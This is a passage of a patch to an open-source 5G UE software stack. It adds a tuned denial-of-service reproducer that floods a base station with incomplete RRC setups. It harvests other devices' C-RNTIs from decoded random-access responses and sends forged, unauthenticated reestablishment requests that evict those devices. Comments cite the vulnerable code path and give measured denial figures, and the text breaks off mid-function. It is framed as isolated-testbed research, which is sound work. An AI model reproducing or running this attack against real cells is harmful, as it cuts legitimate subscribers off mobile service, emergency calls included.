++    rss_cfg_done = true;
++    /* interval_ms 0 is allowed and means "on the next tick", i.e. max rate.
++       The floor is then the RA cycle itself (PRACH occasion + RAR + Msg3 + Msg4). */
++    if (rss_cfg.interval_ms < 0)
++      rss_cfg.interval_ms = 0;
++    if (rss_cfg.reject_backoff_ms < 10)
++      rss_cfg.reject_backoff_ms = 10;
++    rss_cfg.completion_pct = rss_cfg.completion_pct < 0 ? 0 : (rss_cfg.completion_pct > 100 ? 100 : rss_cfg.completion_pct);
++    if (rss_cfg.enable) {
++      LOG_W(NR_RRC,
++            "[RSS] A-type reproducer ENABLED (isolated testbed only): interval=%d ms completion=%d%% "
++            "honor_reject=%d ack_gate=%d max_duration=%d s run_id=%s log=%s\n",
++            rss_cfg.interval_ms,
++            rss_cfg.completion_pct,
++            rss_cfg.honor_reject,
++            rss_cfg.ack_gate,
++            rss_cfg.max_duration_s,
++            rss_cfg.run_id,
++            rss_cfg.log_file);
++    }
++  }
++  return &rss_cfg;
++}
++
++bool nr_rss_enabled(void)
++{
++  return rss_get_cfg()->enable != 0 && !rss_killed;
++}
++
++/* Probe instances behave as ordinary UEs instead of storming: they process
++   RRCSetup normally, send RRCSetupComplete and stay in CONNECTED. Instance 0
++   gets the uicc0 config section (openair3/UICC/usim_interface.c looks up
++   "uicc%d" by Mod_id), which is the only subscriber provisioned in the core,
++   so the probe is the one instance that can actually register.
++   This is the measurement instrument for the success criterion "a normal UE
++   cannot connect or communicate": the reject-gap metric was only a proxy and
++   was never validated against a real UE attempt. */
++int nr_rss_probe_ues(void)
++{
++  const int k = rss_get_cfg()->probe_ues;
++  static int logged;
++  if (!logged) {
++    logged = 1;
++    LOG_W(NR_RRC, "[RSS] probe_ues knob = %d\n", k);
++  }
++  return k < 0 ? 0 : k;
++}
++
++/* RA-only probe: the probe connects on its first try and then stays connected,
++   so it never faces gate 1 (PRACH) or gate 2 (RAR/contention) again - the
++   measurement walks around the attack. Measured 2026-10-22: the probe logged
++   1-2 attempts per run while the storm logged hundreds, so RAR hijacking
++   (100-200 steals in 17 s) almost never hit the probe's own RAR.
++   In this mode the probe skips Msg5 like a storm instance, so it redoes RA
++   continuously, and msg4_rx / attempt_start for ue=0 becomes its RA success
++   rate - a direct measure of gate 1 and gate 2. It stays excluded from the
++   attack knobs themselves (hijack, preamble flood). */
++/* Unauthenticated eviction via the reestablishment reject path.
++   OCUDU `rrc_ue_impl::handle_rrc_reest_request` (lib/rrc/ue/rrc_ue_message_handlers.cpp
++   :118-140, read on the installed build) takes this branch when the DU could not serve
++   the new UE and therefore sent an empty DU-to-CU container:
++
++     if (du_to_cu_container.empty()) {
++       old = cu_cp_notifier.on_rrc_reestablishment_request(msg...ue_id.pci,
++                                                           to_rnti(msg...ue_id.c_rnti));
++       cu_cp_notifier.on_rrc_reestablishment_failure({.ue_index = old.ue_index, ...});
++       logger.log_warning("Sending rrcReject. Cause: DU is not able to serve the UE");
++
++   The old UE is looked up by (PCI, C-RNTI) alone and released. `verify_short_mac_i`
++   exists but only on the normal path (rrc_reestablishment_procedure.cpp:262), which this
++   branch returns before reaching. The project's own methodology.md:140 recorded the same
++   read and flagged it as a scope-review candidate; it was never connected to this goal.
++
++   The A-type storm is what creates the precondition: all 6,564 reject lines in the
++   artifacts carry exactly this branch's cause string. So the storm opens the door and the
++   forged reestablishment walks a third party out of it.
++
++   Targeting: the DU hands out C-RNTIs from a narrow range (0x4601, 0x4602, 0x4604, ...
++   in the logs), so a sweep over a few hundred values covers every live UE within seconds
++   at the measured ~60 attempts/s. No knowledge of the victim is needed, which is why this
++   is an attacker capability and not a testbed concession.
++
++   Probe instances never do this - they are the measurement. */
++/* Division of labour. The eviction branch only runs when the DU could not serve the new
++   UE, i.e. when occupancy is at the ceiling - and the storm is what puts it there. A
++   forged reestablishment REPLACES a setup request, so an instance doing eviction creates
++   no context. Measured 2026-10-22: making every non-probe instance forge dropped the
++   storm to 14.6/s, occupancy never reached 96, the DU served the requests normally and
++   they went down the path that DOES verify shortMAC-I. Nobody was left holding the door
++   open. So only the highest-numbered instances forge; the rest keep filling the ceiling. */
++/* The sweep is diluted by the attacker's own contexts. Measured 2026-10-22: 125 forged
++   reestablishment requests produced 21 `Requesting UE context release for old_ue` lines
++   at the CU, but ~95 of the ~96 live contexts were the storm's own, so a blind sweep hit
++   the single victim about 1% of the time. In a real cell those 96 would be victims, so
++   the dilution is an artifact of a one-victim testbed, not of the attack.
++   It is also removable without knowing anything about the victim: the attacker knows the
++   C-RNTIs it was itself assigned, so it skips those. What remains in the range is, by
++   construction, somebody else. */
++/* Harvested victim C-RNTIs.
++   This cell has a single PRACH occasion, so RA-RNTI is the same for every UE and the
++   attacker already decodes every RAR, including the ones answering other UEs' preambles.
++   Each RAR carries the TC-RNTI the gNB just minted, which becomes that UE's C-RNTI on a
++   successful RA. Recording the TC-RNTIs from RARs whose RAPID is not ours turns the
++   eviction sweep from blind enumeration into direct targeting, with no prior knowledge of
++   the victim - the attacker learns the identity from the air.
++   Measured 2026-10-22 without this: 20 forged requests over 39 s against a 256-wide
++   sweep, ~3.6% ceiling dwell, so the chance of hitting one specific victim was ~0.3%. */
++#define RSS_HARVEST_MAX 256
++static unsigned rss_harvest[RSS_HARVEST_MAX];
++static unsigned rss_harvest_n;
++static unsigned rss_harvest_head;
++static uint64_t rss_harvest_ts[RSS_HARVEST_MAX];
++/* Highest C-RNTI ever seen in a decoded RAR. The gNB allocates C-RNTIs
++   sequentially and the value drifts between runs - measured 2026-10-22, the
++   victim sat at 0x4611/0x464a in one run and 0x4719/0x47ab in another, so the
++   static sweep range (0x4600..0x4640) had become a dead range. Tracking the
++   allocator lets the sweep follow it. Our own instances attach constantly, so
++   this stays close to whatever the gNB is handing out right now. */
++static unsigned rss_crnti_seen_max;
++
++void nr_rss_note_victim_crnti(unsigned crnti)
++{
++  if (crnti == 0 || nr_rss_is_own_crnti(crnti))
++    return;
++  for (unsigned i = 0; i < rss_harvest_n; i++)
++    if (rss_harvest[i] == crnti) {
++      /* Re-seen: refresh so a victim that keeps reattaching stays fresh while a
++         C-RNTI that is gone for good ages out of the eligible window. */
++      rss_harvest_ts[i] = rss_now_ns();
++      return;
++    }
++  if (crnti > rss_crnti_seen_max)
++    rss_crnti_seen_max = crnti;
++  rss_harvest[rss_harvest_head] = crnti;
++  rss_harvest_ts[rss_harvest_head] = rss_now_ns();
++  rss_harvest_head = (rss_harvest_head + 1) % RSS_HARVEST_MAX;
++  if (rss_harvest_n < RSS_HARVEST_MAX)
++    rss_harvest_n++;
++}
++
++/* Returns 0 when nothing has been harvested yet, so the caller falls back to the sweep. */
++int nr_rss_evict_min_age_ms(void)
++{
++  const int m = rss_get_cfg()->evict_min_age_ms;
++  return m < 0 ? 0 : m;
++}
++
++int nr_rss_evict_max_age_ms(void)
++{
++  const int m = rss_get_cfg()->evict_max_age_ms;
++  return m <= 0 ? 1000000 : m;
++}
++
++int nr_rss_evict_sticky_ms(void)
++{
++  const int m = rss_get_cfg()->evict_sticky_ms;
++  return m < 0 ? 0 : m;
++}
++
++/* sticky victim state, shared by nr_rss_pick_victim_crnti() and its setter */
++static unsigned sticky;
++static uint64_t sticky_since;
++static void rss_sticky_set(unsigned c) { sticky = c; sticky_since = rss_now_ns(); }
++
++unsigned nr_rss_pick_victim_crnti(void)
++{
++  /* Newest first, not round-robin. A blind sweep cannot win here: the live
++     C-RNTI range is ~211 wide (0x4601..0x46d3 observed) and the entire eviction
++     budget is bounded by RA throughput (~54/s measured), so one full pass takes
++     ~21 s while a normal UE reattaches in 200-600 ms. Round-robin over the
++     harvest ring had the same dilution - 1,369 targeted attempts spread about 5
++     hits per value over 41 s, and a normal UE slipped through with a working PDU
++     session (ue=300, 2026-10-22). Spending the whole budget on the most recently
++     harvested identity puts it on whoever just attached, which is what a
++     targeted attacker would do and what sustained denial requires. */
++  /* Stick to one victim. Newest-first alone wandered: with six evictors all
++     harvesting, newer non-own C-RNTIs keep displacing the live victim, so fire
++     drifts off it. Measured 2026-10-22 (m_foc2): the probe kept a PDU session
++     for 12.8 s while 743 targeted requests were in flight. A targeted attacker
++     instead hammers one identity until it stops coming back. Refresh every
++     RSS_STICKY_MS so a victim that has gone away is replaced - that cadence has
++     to track how fast a normal UE reattaches (200-600 ms measured). */
++  /* evict_sticky_ms == 0 selects round-robin over non-own entries, which is the
++     default because sticking was measured to be worse. With own-filtering
++     working the ring holds only a couple of non-own identities, so sticking
++     parks the whole budget on whichever one is newest - and if that identity is
++     stale the budget is wasted. Measured 2026-10-22 (q_t2): 1,619 of 1,740
++     forged requests went to 0x4676, a C-RNTI that no longer existed, and only
++     105 (6.0%) named the live victim. Rotating over the non-own entries gives
++     the live victim a fair share instead. */
++  if (nr_rss_evict_sticky_ms() == 0) {
++    static unsigned cursor;
++    if (rss_harvest_n == 0)
++      return 0;
++    const uint64_t now = rss_now_ns();
++    const uint64_t lo_ns = (uint64_t)nr_rss_evict_min_age_ms() * 1000000ULL;
++    const uint64_t hi_ns = (uint64_t)nr_rss_evict_max_age_ms() * 1000000ULL;
++    for (unsigned guard = 0; guard < rss_harvest_n; guard++) {
++      const unsigned slot = cursor++ % rss_harvest_n;
++      const unsigned c = rss_harvest[slot];
++      /* Eligible only inside an age window. Too young means one of our own
++         evictor instances has not registered its C-RNTI yet (the harvest sees
++         every RAR, so roughly 42 of our own per second enter the ring against
++         the victim's 0.2/s). Too old means the identity is gone: measured
++         2026-10-22 (q_t2), 1,619 of 1,740 forged requests went to 0x4676, a
++         C-RNTI that no longer existed, while only 105 (6.0%) named the live
++         victim - and those 105 alone produced 94.7% denial. A live victim is
++         re-harvested on every reattach, so it stays inside the window. */
++      const uint64_t age = now - rss_harvest_ts[slot];
++      if (age < lo_ns || age > hi_ns)
++        continue;
++      if (c != 0 && !nr_rss_is_own_crnti(c))
++        return c;
++    }
++    return 0;
++  }
++  {
++    const uint64_t now = rss_now_ns();
++    /* The hold has to be SHORTER than a normal UE takes to reach the user
++       plane, or targeting arrives after it is already served. Measured
++       2026-10-22: ICS at +41..+453 ms, PDU at +306..+661 ms, and with a
++       1000 ms hold the forged request naming the victim arrived 2.07 s
++       after it attached (q_t2 ue=1623, which kept a PDU session 2.07 s). */
++    const uint64_t hold_ns = (uint64_t)nr_rss_evict_sticky_ms() * 1000000ULL;
++    if (sticky != 0 && !nr_rss_is_own_crnti(sticky)
++        && now - sticky_since < hold_ns)
++      return sticky;
++    sticky = 0;
++    sticky_since = now;
++  }
++  if (rss_harvest_n == 0)
++    return 0;
++  /* liveness gate on the sticky path. Sticking supplies CONTINUITY, which is
++     what actually produced denial: measured 2026-10-22, q_t2 reached 5.3%
++     availability with only 6.0% aim because its 105 probe-aimed requests
++     landed continuously on one live victim, while dispersing aim to 73.6% by
++     rotating made denial WORSE (x_t1, 77.5%). But sticking without a liveness
++     check parked 93% of the budget on 0x4676, a C-RNTI that no longer existed.
++     The age window supplies liveness, so the two belong together - this path
++     had no age gate before, which is why the combination was never tested. */
++  const uint64_t pick_now = rss_now_ns();
++  const uint64_t pick_lo = (uint64_t)nr_rss_evict_min_age_ms() * 1000000ULL;
++  const uint64_t pick_hi = (uint64_t)nr_rss_evict_max_age_ms() * 1000000ULL;
++  for (unsigned back = 1; back <= rss_harvest_n; back++) {
++    const unsigned idx = (rss_harvest_head + RSS_HARVEST_MAX - back) % RSS_HARVEST_MAX;
++    const unsigned c = rss_harvest[idx];
++    const uint64_t age = pick_now - rss_harvest_ts[idx];
++    if (age < pick_lo || age > pick_hi)
++      continue;
++    if (c != 0 && !nr_rss_is_own_crnti(c)) {
++      rss_sticky_set(c);
++      return c;
++    }
++  }
++  return 0;
++}
++
++#define RSS_OWN_MAX 4096
++static uint8_t rss_own_crnti[RSS_OWN_MAX / 8];
++
++void nr_rss_note_own_crnti(int ue, unsigned crnti)
++{
++  /* Probe instances are the victim, not the attacker. They live in the same process only
++     because this testbed has one radio, so a process-global "own" set would classify the
++     victim as friendly and the harvest would discard exactly the identity it needs.
++     Measured 2026-10-22: with the probe registering here, the harvest ring stayed empty
++     and every eviction fell back to blind sweeping (targeted = 0 in all runs). */
++  if (nr_rss_is_probe(ue))
++    return;
++  const unsigned i = crnti % RSS_OWN_MAX;
++  rss_own_crnti[i / 8] |= (uint8_t)(1u << (i % 8));
++}
++
++bool nr_rss_is_own_crnti(unsigned crnti)
++{
++  const unsigned i = crnti % RSS_OWN_MAX;
++  return (rss_own_crnti[i / 8] >> (i % 8)) & 1u;
++}
++
++bool nr_rss_is_evictor(int ue, int n_ue)
++{
++  const int k = rss_get_cfg()->evict_ues;
++  if (k <= 0 || rss_get_cfg()->evict_crnti_hi <= 0)
++    return false;
++  return ue >= n_ue - k;
++}
++
++/* Adaptive sweep bounds. Falls back to the configured lo..hi when adaptive is
++   off or nothing has been observed yet. The window sits just below the highest
++   observed C-RNTI because that is where the allocator just handed values out,
++   which is where a UE that attached moments ago lives. Keeping it narrow
++   matters: at r requests/s a window of w is revisited every w/r seconds, and a
++   normal UE reaches its PDU session in 238..715 ms (measured), so a wide window
++   lets it slip through. */
++unsigned nr_rss_sweep_lo(void)
++{
++  const rss_cfg_t *c = rss_get_cfg();
++  if (c->evict_adaptive == 0 || rss_crnti_seen_max == 0)
++    return (unsigned)(c->evict_crnti_lo > 0 ? c->evict_crnti_lo : 1);
++  const unsigned w = (unsigned)(c->evict_window > 0 ? c->evict_window : 32);
++  return rss_crnti_seen_max > w ? rss_crnti_seen_max - w : 1;
++}
++
++unsigned nr_rss_sweep_hi(void)
++{
++  const rss_cfg_t *c = rss_get_cfg();
++  if (c->evict_adaptive == 0 || rss_crnti_seen_max == 0)
++    return (unsigned)(c->evict_crnti_hi > 0 ? c->evict_crnti_hi : 1);
++  return rss_crnti_seen_max + 8;
++}
++
++int nr_rss_evict_lo(void)
++{
++  return rss_get_cfg()->evict_crnti_lo;
++}
++
++int nr_rss_evict_hi(void)
++{
++  return rss_get_cfg()->evict_crnti_hi;
++}
++
++int nr_rss_evict_pci(void)
++{
++  return rss_get_cfg()->evict_pci;
++}
++
++bool nr_rss_probe_ra_only(void)
++{
++  return rss_get_cfg()->probe_ra_only != 0;
++}
++
++/* The probe is instrumentation, not the attack. With no delay it starts its RA
++   at the same instant the attackers do and completes attach in 174..326 ms
++   (measured) while the evictors are still spinning up, so it wins its first race
++   by construction and is then immune - the eviction path only works within about
++   2..7 s of attach (120/120 evictions, max 7.16 s, measured 2026-10-22). That
++   biased every run in the victim's favour. Delaying the probe models the case
++   the goal actually describes: a normal UE arriving at a cell that is already
++   under attack. It never makes the probe's attach fail - it only changes when
++   the probe first asks. */
++int nr_rss_probe_delay_ms(void)
++{
++  const int m = rss_get_cfg()->probe_delay_ms;
++  return m < 0 ? 0 : m;
++}
++
++bool nr_rss_probe_withheld(int ue)
++{
++  if (!nr_rss_is_probe(ue) || nr_rss_probe_delay_ms() == 0 || rss_t0_ns == 0)
++    return false;
++  return rss_now_ns() - rss_t0_ns < (uint64_t)nr_rss_probe_delay_ms() * 1000000ULL;
++}
++
++bool nr_rss_is_probe(int ue)
++{
++  return ue >= 0 && ue < nr_rss_probe_ues();
++}
++
++int nr_rss_anas_ues(void)
++{
++  const int n = rss_get_cfg()->anas_ues;
++  return n < 0 ? 0 : n;
++}
++
++/* A-NAS holders sit just above the probes, so they never collide with the
++   evictors, which are taken from the top (nr_rss_is_evictor).
++   WHY: A-type never sends Msg5, so a context lives exactly the gNB's
++   t300 + rrc_procedure_guard_time_ms (measured 2,197 ms) and occupancy is
++   capped at accept_rate x hold = 42.5 x 2.197 = 93.4 against a ceiling of 96 --
++   3% short, on a rate the gNB pins. Sending Msg5 cancels that guard: a
++   completed context has no expiry, so a holder connects once and simply stays.
++   With H holders the A-type storm only has to cover 96 - H, which it already
++   can from H >= 3. No restart is involved, so this avoids the release-from-
++   timer path that crashed the UE on 2026-10-20 (run SAT-1019T220108Z). */
++bool nr_rss_is_anas(int ue)
++{
++  const int lo = nr_rss_probe_ues();
++  const int n = nr_rss_anas_ues();
++  return n > 0 && ue >= lo && ue < lo + n;
++}
++
++/* A-NAS churn. The NGAP guard OCUDU applies is purely time based -- measured
++   2026-10-22: "UE did not request a PDU session after 3000ms. Releasing UE from
++   DU" -- so the gNB holds a completed context for 3 s whether or not we keep
++   the link alive. Staying connected therefore buys nothing and costs a UE
++   instance, which capped A-NAS occupancy at the instance count (<= 32).
++   Starting a fresh RA right after Msg5 instead makes occupancy rate x hold
++   again: 42.5/s x 3.143 s = 133 against a ceiling of 96.
++   rss_poll() ends in handle_t300_expiry() with no RRC-state guard, so the new
++   RA proceeds from RRC_CONNECTED without any teardown -- this deliberately
++   avoids the UE-initiated release that crashed the UE on 2026-10-20
++   (SAT-1019T220108Z). The gap must clear Msg5 on the air first: measured
++   Msg3->Msg5 at the CU was 21.7 ms, so the 80 ms default has ~3.7x margin. */
++int nr_rss_anas_gap_ms(void)
++{
++  const int g = rss_get_cfg()->anas_gap_ms;
++  return g < 0 ? 0 : g;
++}
++
++/* Harvester role. Coverage - the chance we hold the victim's C-RNTI inside its
++   2..7 s eviction window - is the measured bottleneck: about 1/3, which bounds
++   availability at >= 1 - coverage (observed 77..99.7%). We only decode a
++   victim's RAR when we sent a preamble in the SAME PRACH occasion, because
++   RA-RNTI is derived from the occasion. Occasions run at 100/s but our RA tops
++   out near 50/s, since every instance pays for the whole
++   preamble->RAR->Msg3->Msg4 cycle.
++   A harvester pays only for preamble->RAR, which is all harvesting needs, so it
++   can occupy far more occasions. It creates no gNB context (that is why
++   msg4_wait=0 was written off as "no load") - here that is the point. Evictors
++   stay separate because the forged request IS the Msg3 payload, which a
++   harvester never sends. Layout: probe | anas | harvesters | evictors(top). */
++int nr_rss_harvest_ues(void)
++{
++  const int n = rss_get_cfg()->harvest_ues;
++  return n < 0 ? 0 : n;
++}
++
++bool nr_rss_is_harvester(int ue)
++{
++  const int lo = nr_rss_probe_ues() + nr_rss_anas_ues();
++  const int n = nr_rss_harvest_ues();
++  return n > 0 && ue >= lo && ue < lo + n;
++}
++
++bool nr_rss_honor_reject(void)
++{
++  return rss_get_cfg()->honor_reject != 0;
++}
++
++/* How many RA procedures one UE instance may run at once. The MAC clamps this
++   to NR_UE_MAX_PARALLEL_RA; 1 reproduces upstream exactly. */
++int nr_rss_ra_depth(void)
++{
++  const int d = rss_get_cfg()->ra_depth;
++  return d < 1 ? 1 : d;
++}
++
++int nr_rss_reject_backoff_ms(void)
++{
++  return rss_get_cfg()->reject_backoff_ms;
++}
++
++void nr_rss_log(int ue, const char *event, const char *fmt, ...)
++{
++  const rss_cfg_t *cfg = rss_get_cfg();
++  if (!cfg->enable || !cfg->log_file || !cfg->log_file[0])
++    return;
++  if (!rss_log_fd) {
++    rss_log_fd = fopen(cfg->log_file, "a");
++    if (!rss_log_fd) {
++      LOG_E(NR_RRC, "[RSS] cannot open %s for writing\n", cfg->log_file);
++      return;
++    }
++  }
++  fprintf(rss_log_fd,
++          "{\"type\":\"event\",\"run_id\":\"%s\",\"ue\":%d,\"seq\":%u,\"t_ns\":%llu,\"air_ms\":%llu,\"event\":\"%s\"",
++          cfg->run_id ? cfg->run_id : "",
++          ue < 0 || ue >= RSS_MAX_UE ? 0 : ue,
++          rss_seq[ue < 0 || ue >= RSS_MAX_UE ? 0 : ue],
++          (unsigned long long)rss_now_ns(),
++          (unsigned long long)(rss_air_frame * 10),
++          event);
++  if (fmt && fmt[0]) {
++    va_list ap;
++    va_start(ap, fmt);
++    fputc(',', rss_log_fd);
++    vfprintf(rss_log_fd, fmt, ap);
++    va_end(ap);
++  }
++  fprintf(rss_log_fd, "}\n");
++  fflush(rss_log_fd);
++}
++
++unsigned nr_rss_next_seq(int ue)
++{
++  if (ue < 0 || ue >= RSS_MAX_UE)
++    ue = 0;
++  if (rss_t0_ns == 0)
++    rss_t0_ns = rss_now_ns();
++  /* Close out the previous attempt. An attempt that never saw Msg4 means the
++     gNB did not answer or the contention was lost. Under saturation this
++     fraction is the denial signal we can read without a second UE. */
++  if (rss_seq[ue] > 0 && !rss_got_msg4[ue])
++    nr_rss_log(ue, "attempt_end", "\"actual_reach\":\"no_msg4\"");
++  rss_got_msg4[ue] = false;
++  return ++rss_seq[ue];
++}
++
++/* Should the attempt wait for Msg4 before restarting?
++ *
++ * Measured 2026-10-20 (60 s runs, single UE, default gNB config): the attempt
++ * cycle is pinned at 40 ms of air time and 30 ms of it, 78% of the wall cost,
++ * is the wait between Msg3 and Msg4. The gNB has already created the UE context
++ * and started "RRC Setup Procedure" when it decoded Msg3, so that wait buys the
++ * attacker nothing. msg4_wait=0 abandons the attempt once Msg3 is on the air.
++ *
++ * This is a VARIANT of A-type, not A-type: Msg4 is never accepted or ACKed, so
++ * the gNB also retransmits rrcSetup over DL HARQ. Runs must be labelled with
++ * the knob value, which run.json records.
++ */
++bool nr_rss_wait_for_msg4(void)
++{
++  return rss_get_cfg()->msg4_wait != 0;
++}
++
++void nr_rss_note_msg4(int ue)
++{
++  if (ue < 0 || ue >= RSS_MAX_UE)
++    ue = 0;
++  rss_got_msg4[ue] = true;
++}
++
++void nr_rss_note_skip(void)
++{
++  rss_skip_ts[rss_skip_head] = rss_now_ns();
++  rss_skip_head = (rss_skip_head + 1) % RSS_OCC_WINDOW;
++}
++
++unsigned nr_rss_occupancy(void)
++{
++  const uint64_t hold_ns = (uint64_t)rss_get_cfg()->hold_ms * 1000000ULL;
++  const uint64_t now = rss_now_ns();
++  unsigned n = 0;
++  for (unsigned i = 0; i < RSS_OCC_WINDOW; i++)
++    if (rss_skip_ts[i] != 0 && now - rss_skip_ts[i] < hold_ns)
++      n++;
++  return n;
++}
++
++/* A completed attempt leaves RRC in CONNECTED, and a new RRCSetupRequest is
++   only sent from RRC_IDLE, so the loop stops there. Releasing the connection
++   from this timer was tried on the box 2026-10-20 and crashed the UE right
++   after the release (probe_release -> resync -> SIGSEGV, run SAT-1019T220108Z),
++   so that path is removed. completion_pct > 0 therefore ends the run at its
++   first completed attempt and is only useful for one-shot checks.
++   Denial does not need it: once the cell is full the gNB answers an ordinary
++   RRCSetupRequest with RRCReject, which is logged as actual_reach=rrc_reject
++   and is exactly what a legitimate UE would receive. */
++
++/* Deterministic stride instead of a coin flip: the realised completion ratio is
++   exact and the same run is replayable for the detection team. */
++bool nr_rss_complete_this_attempt(void)
++{
++  const rss_cfg_t *cfg = rss_get_cfg();
++  if (cfg->completion_pct <= 0)
++    return false;
++  if (cfg->completion_pct >= 100)
++    return true;
++  unsigned due = (rss_seq[0] * (unsigned)cfg->completion_pct) / 100;
++  if (due > rss_completed) {
++    rss_completed = due;
++    return true;
++  }
++  return false;
++}
++
++/* Box measurement 2026-10-20: a 100 ms target armed with nr_timer_setup() fired
++   after 306 ms (median of 71 attempts). nr_timer_tick() adds a fixed 10 ms per
++   call, but one call is one radio-frame message, and over the ZMQ path those do
++   not arrive every 10 ms. Counting ticks therefore multiplies the whole knob by
++   the tick error. A wall-clock deadline bounds the error at one tick instead of
++   accumulating it, so the timer below is only a once-per-tick poll. */
++/* Spread the instances across the gNB's hold time, once.
++ *
++ * Why: the gNB holds every incomplete context for exactly t300 + guard (box
++ * measured 1999 ms median, p90 2000 ms), so the arrival pattern is copied onto
++ * the release pattern 2 s later. Instances that fire together therefore free
++ * their slots together, occupancy drops below the cell's ceiling, and the
++ * rejection stream stops until the cell refills. Box measured 2026-10-21 at
++ * 6 UE: 25% of rejection gaps exceeded 100 ms and the longest was 1130 ms,
++ * while attempts kept arriving at ~41/s throughout the gaps.
++ *
++ * The offset is applied ONLY to an instance's first arming. Adding it to every
++ * retry would lengthen that instance's cycle permanently and cost demand; one
++ * shift sets the phase and the cycles then drift on their own.
++ *
++ * REFUTED on the box 2026-10-21. Same build, same session, warm-up run first,
++ * 6 UE, 90 s each: stagger on 1431 attempts (15.9/s) and 0 attempts on a repeat,
++ * stagger off 5468 attempts (60.8/s). Default is therefore OFF.
++ *
++ * Why it cannot work in this design: rss_flush_locked() in nr-ue-ru.c emits the
++ * merged uplink batch when wr_joined >= n_ue, i.e. the shared transmit path
++ * assumes every instance contributes to every slot. Staggering makes instances
++ * deliberately idle at different times, so the batch never completes and the
++ * whole TX cadence breaks. The same assumption killed RSS_SHARE_WR_MONOTONIC
++ * and the bounded join wait: anything that breaks the per-slot batch premise
++ * collapses the attempt rate. Set RSS_PHASE_STAGGER=1 to reproduce. */
++static bool rss_phase_done[RSS_MAX_UE];
++
++static uint64_t rss_phase_offset_ns(int ue, int hold_ms)
++{
++  static int cached = -1;
++  if (cached < 0) {
++    const char *env = getenv("RSS_PHASE_STAGGER");
++    cached = env ? (atoi(env) != 0) : 0; /* refuted: default off */
++  }
++  if (!cached || ue < 0 || ue >= RSS_MAX_UE || rss_phase_done[ue])
++    return 0;
++  rss_phase_done[ue] = true;
++  int n = NB_UE_INST > 0 ? NB_UE_INST : 1;
++  if (n <= 1)
++    return 0;
++  return (uint64_t)ue * (uint64_t)hold_ms * 1000000ULL / (uint64_t)n;
++}
++
++void nr_rss_arm_retry(NR_UE_RRC_INST_t *rrc, int delay_ms)
++{
++  const rss_cfg_t *cfg = rss_get_cfg();
++  NR_UE_Timers_Constants_t *tac = &rrc->timers_and_constants;
++  int d = delay_ms > 0 ? delay_ms : cfg->interval_ms;
++  uint64_t phase = rss_phase_offset_ns((int)rrc->ue_id, cfg->hold_ms);
++  if (phase)
++    LOG_I(NR_RRC, "[RSS] ue=%d phase offset %llu ms (hold %d ms / %d UE)\n",
++          (int)rrc->ue_id, (unsigned long long)(phase / 1000000ULL), cfg->hold_ms, NB_UE_INST);
++  tac->rss_deadline_ns = rss_now_ns() + (uint64_t)d * 1000000ULL + phase;
++  nr_timer_setup(&tac->rss_retry_timer, 10, 10);
++  nr_timer_start(&tac->rss_retry_timer);
++}
++
++static void rss_poll(NR_UE_RRC_INST_t *rrc)
++{
++  NR_UE_Timers_Constants_t *tac = &rrc->timers_and_constants;
++  NR_timer_t *t = &tac->rss_retry_timer;
++  const rss_cfg_t *cfg = rss_get_cfg();
++
++  /* Tick-rate instrumentation. One call here is one radio frame, nominally
++     10 ms. Logging the measured value turns the "configured vs realised"
++     mismatch from a guess into a number. */
++  rss_air_frame = (uint64_t)rrc->current_hfn * 1024 + (uint64_t)rrc->current_frame;
++  if (cfg->enable) {
++    uint64_t now = rss_now_ns();
++    rss_ticks++;
++    if (rss_tick_t0_ns == 0) {
++      rss_tick_t0_ns = now;
++      rss_air_frame_t0 = rss_air_frame;
++    } else if (cfg->tick_report > 0 && rss_ticks % (unsigned)cfg->tick_report == 0) {
++      double wall_ms = (double)(now - rss_tick_t0_ns) / 1e6;
++      double air_ms = (double)((rss_air_frame - rss_air_frame_t0) * 10);
++      nr_rss_log((int)rrc->ue_id, "tick_rate",
++                 "\"ms_per_tick\":%.2f,\"nominal_ms\":10,\"air_ms_elapsed\":%.0f,"
++                 "\"wall_ms_elapsed\":%.0f,\"air_per_wall\":%.3f",
++                 wall_ms / (double)cfg->tick_report,
++                 air_ms,
++                 wall_ms,
++                 wall_ms > 0 ? air_ms / wall_ms : 0.0);
++      rss_tick_t0_ns = now;
++      rss_air_frame_t0 = rss_air_frame;
++    }
++  }
++
++  bool polled = nr_timer_tick(t);
++
++  {
++    static int seen[RSS_MAX_UE];
++    const int u = ((int)rrc->ue_id >= 0 && (int)rrc->ue_id < RSS_MAX_UE) ? (int)rrc->ue_id : 0;
++    if (!seen[u]) {
++      seen[u] = 1;
++      LOG_W(NR_RRC, "[RSS] rss_poll reached: ue=%d enabled=%d probe=%d polled=%d\n",
++            u, (int)nr_rss_enabled(), (int)nr_rss_is_probe(u), (int)polled);
++    }
++  }
++  if (!nr_rss_enabled())
++    return;
++
++  /* The probe drives itself off rss_probe_next_ns, not off the retry timer:
++     nr_rss_arm_retry() is only called on RRCReject, and a probe that is simply
++     losing the RA race never gets one, so the timer was never started and the
++     branch below never ran (measured 2026-10-22: probe_attempt logged 0 times
++     in every run). Let probes through regardless of the timer. */
++  /* A-NAS holders drive themselves from here, like the probe does. Re-arming
++     from nr_rrc_going_to_IDLE() instead was tried on 2026-10-22 and reproduced
++     the 2026-10-20 crash shape (channel timeout -> Resynchronizing RX -> core),
++     because a retry armed mid-teardown can fire on the next tick while the UE
++     is only half released. Polling from here never touches teardown. */
++  if (!polled && !nr_rss_is_probe((int)rrc->ue_id) && !nr_rss_is_anas((int)rrc->ue_id))
++    return;
++
++  /* A completed context is held by the gNB for its own NGAP guard (3000 ms
++     measured), so while we are CONNECTED there is nothing to do: starting a new
++     RA here is the refuted churn path (Msg5 104 -> InitialUEMessage 7, hold
++     collapsed back to 1999 ms). Wait for the gNB to release us, then take a new
++     slot from IDLE on a later tick. */
++  if (nr_rss_is_anas((int)rrc->ue_id) && rrc->nrRrcState == RRC_STATE_CONNECTED_NR)
++    return;
++
++  /* Probe path: behave as an ordinary UE. Keep attempting until connected and
++     skip every attack knob (occupancy target, RA gate, ACK gate) - those exist
++     to shape the storm, not the thing being measured. Logs one probe_attempt
++     per try and one probe_connected with the try count and the elapsed time,
++     so the result is "how long did a normal UE need" instead of a coin flip. */
++  if (nr_rss_is_probe((int)rrc->ue_id) && !nr_rss_probe_ra_only()) {
++    {
++      static int entered;
++      if (!entered) { entered = 1; LOG_W(NR_RRC, "[RSS] probe branch entered ue=%d\n", (int)rrc->ue_id); }
++    }
++    const int pu = ((int)rrc->ue_id >= 0 && (int)rrc->ue_id < RSS_MAX_UE) ? (int)rrc->ue_id : 0;
++    const uint64_t pnow = rss_now_ns();
++    if (nr_rss_probe_withheld((int)rrc->ue_id))
++      return; /* not arrived yet */
++    if (rrc->nrRrcState == RRC_STATE_CONNECTED_NR) {
